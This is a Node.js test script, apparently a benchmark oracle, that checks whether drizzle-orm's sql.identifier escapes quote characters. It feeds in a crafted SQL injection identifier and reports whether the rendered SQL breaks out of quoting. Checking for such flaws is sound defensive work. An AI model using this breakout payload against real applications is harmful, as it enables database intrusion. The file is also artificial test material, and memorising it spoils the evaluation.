'use strict';

function main() {
  let sql;
  let SQLiteSyncDialect;
  try {
    const mod = require('drizzle-orm');
    sql = mod.sql;
    if (!sql || typeof sql.identifier !== 'function') {
      throw new Error('sql.identifier not available on drizzle-orm module');
    }
    const sqliteCore = require('drizzle-orm/sqlite-core');
    SQLiteSyncDialect = sqliteCore.SQLiteSyncDialect;
    if (typeof SQLiteSyncDialect !== 'function') {
      throw new Error('SQLiteSyncDialect not available on drizzle-orm/sqlite-core module');
    }
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup failed: could not load drizzle-orm sql.identifier / SQLiteSyncDialect: ' + String(e && e.message || e)
    }));
    return;
  }

  let dialect;
  try {
    dialect = new SQLiteSyncDialect();
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'setup failed: could not construct SQLiteSyncDialect: ' + String(e && e.message || e)
    }));
    return;
  }

  function render(chunk) {
    // The chunk returned by sql.identifier() is a SQL template object.
    // Dialects expose sqlToQuery(sqlObject) to render it into {sql, params}.
    // We try the canonical API first, then fall back to alternative
    // rendering entry points that have existed across drizzle-orm versions,
    // without assuming any particular internal error string.
    if (typeof dialect.sqlToQuery === 'function') {
      const result = dialect.sqlToQuery(chunk);
      if (result && typeof result.sql === 'string') {
        return result.sql;
      }
      throw new Error('sqlToQuery did not return an object with a string sql field');
    }
    if (typeof dialect.buildSQL === 'function') {
      const result = dialect.buildSQL(chunk);
      if (result && typeof result.sql === 'string') {
        return result.sql;
      }
    }
    throw new Error('no suitable rendering method found on dialect');
  }

  const marker = 'drizzle_sqli_check_' + process.pid + '_' + Date.now();

  // Step 1: benign input - verify normal identifier escaping works end-to-end.
  let benignSqlText;
  try {
    const benignIdentifier = 'normal_column_name_' + marker;
    const benignChunk = sql.identifier(benignIdentifier);
    benignSqlText = render(benignChunk);

    if (typeof benignSqlText !== 'string' || !benignSqlText.includes(benignIdentifier)) {
      throw new Error('benign identifier was not rendered as expected: ' + JSON.stringify(benignSqlText));
    }
    const expectedBenign = '"' + benignIdentifier + '"';
    if (benignSqlText.trim() !== expectedBenign) {
      throw new Error('benign identifier did not match expected quoting: ' + JSON.stringify(benignSqlText));
    }
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign operation failed: ' + String(e && e.message || e)
    }));
    return;
  }

  // Benign operation succeeded; proceed with malicious input.
  let operation_completed = true;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    // Malicious input: attacker-controlled identifier containing an embedded
    // double-quote delimiter, attempting to break out of the quoted identifier
    // and inject additional SQL syntax (classic dynamic-sort/alias injection
    // pattern described in the advisory: sql.identifier(untrustedSortField)).
    const maliciousIdentifier = 'id" , (SELECT 1) AS "x';
    const maliciousChunk = sql.identifier(maliciousIdentifier);
    const renderedSql = render(maliciousChunk);

    if (typeof renderedSql !== 'string') {
      throw new Error('malicious identifier rendering produced non-string output');
    }

    const normalizedRendered = renderedSql.trim();

    const vulnerablePattern = '"id" , (SELECT 1) AS "x"';
    const safePattern = '"id"" , (SELECT 1) AS ""x"';

    if (normalizedRendered === vulnerablePattern) {
      exploit_succeeded = true;
      evidence = 'Malicious identifier broke out of quoting; rendered SQL: ' + JSON.stringify(normalizedRendered);
    } else if (normalizedRendered === safePattern) {
      exploit_succeeded = false;
      evidence = 'Malicious identifier was safely escaped; rendered SQL: ' + JSON.stringify(normalizedRendered);
    } else {
      const breakoutMarker = '" , (SELECT 1) AS "x"';
      const escapedMarker = '"" , (SELECT 1) AS ""x"';
      if (normalizedRendered.includes(breakoutMarker) && !normalizedRendered.includes(escapedMarker)) {
        exploit_succeeded = true;
        evidence = 'Malicious identifier broke out of quoting (heuristic match); rendered SQL: ' + JSON.stringify(normalizedRendered);
      } else if (normalizedRendered.includes(escapedMarker)) {
        exploit_succeeded = false;
        evidence = 'Malicious identifier was safely escaped (heuristic match); rendered SQL: ' + JSON.stringify(normalizedRendered);
      } else {
        exploit_succeeded = false;
        evidence = 'Could not confirm injection pattern; rendered SQL: ' + JSON.stringify(normalizedRendered);
      }
    }
  } catch (e) {
    exploit_succeeded = false;
    evidence = 'malicious call raised exception (treated as blocked): ' + String(e && e.message || e);
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed,
    exploit_succeeded,
    evidence
  }));
}

main();
